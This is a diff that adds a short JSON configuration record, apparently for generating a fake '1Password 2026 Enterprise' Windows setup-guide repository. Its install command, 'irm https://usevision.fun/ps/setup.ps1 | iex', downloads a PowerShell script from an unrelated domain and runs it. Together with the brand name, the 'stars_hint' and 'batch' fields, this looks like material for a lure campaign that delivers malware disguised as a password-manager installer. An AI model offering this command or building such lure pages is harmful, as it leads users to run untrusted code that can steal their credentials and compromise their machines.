@@ -1,0 +1,12 @@
+{
+  "repo": "1Password-2026-Setup-Windows-Guide",
+  "product": "1Password 2026 Enterprise",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 12,
+  "batch": "new28",
+  "format": "troubleshooting-guide",
+  "category": "utility-software"
+}
